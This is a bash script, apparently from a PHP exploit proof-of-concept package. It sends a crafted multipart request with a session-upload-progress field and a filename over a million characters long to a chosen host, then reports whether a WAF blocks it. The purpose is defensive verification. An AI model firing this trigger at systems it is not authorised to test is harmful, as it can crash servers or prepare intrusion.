#!/bin/bash
# php2shell-safe-poc: WAF verification
#
# Sends the identical probe from probe_oom.sh at a public, WAF-fronted
# hostname and reports whether the WAF blocks it before it reaches PHP.
# Prints the cf-ray header (if present) so you can cross-reference this
# exact request against your WAF's security event log to find which rule
# fired.
#
# Usage: HOST=<public hostname behind WAF> PATH_=/index.php bash scripts/verify_waf.sh
set -u

HOST="${HOST:?set HOST=<public hostname behind your WAF>}"
PATH_="${PATH_:-/index.php}"
BND="UctxPoc2026"
SID="u0123456789abcdefghijklmnopqrstuv"
NAMELEN="${NAMELEN:-1300000}"

WORKDIR="$(mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT

{
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n%s\r\n' "$SID"
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="f"; filename="'
  python3 -c "import sys; sys.stdout.write('N'*$NAMELEN)"
  printf '"\r\n\r\n'
  python3 -c "import sys; sys.stdout.buffer.write(b'A'*6144)"
  printf '\r\n--%s--\r\n' "$BND"
} > "$WORKDIR/arm_body.bin"

echo "Sending probe to https://$HOST$PATH_ (through WAF/CDN) ..."
RESP=$(curl -sk -i -X POST "https://$HOST$PATH_" \
  -H "Cookie: PHPSESSID=$SID" \
  -H "Content-Type: multipart/form-data; boundary=$BND" \
  --data-binary @"$WORKDIR/arm_body.bin")

echo "$RESP"
echo

CFRAY=$(echo "$RESP" | grep -i '^cf-ray:' | tr -d '\r' | awk '{print $2}')

if echo "$RESP" | grep -q "HTTP/1.1 403"; then
  echo "[RESULT] WAF BLOCKED the probe (403)."
  if [ -n "${CFRAY:-}" ]; then
    echo "         cf-ray: $CFRAY — look this up in your WAF's Security Events log to"
    echo "         identify the exact rule that fired."
  else
    echo "         No cf-ray header seen — confirm this host is actually proxied."
  fi
elif echo "$RESP" | grep -q "HTTP/1.1 500"; then
  echo "[RESULT] Request passed the WAF and reached PHP, which returned 500."
  echo "         The WAF is NOT blocking this probe — escalate, don't rely on it alone."
else
  echo "[RESULT] Unrecognized response — inspect manually."
fi
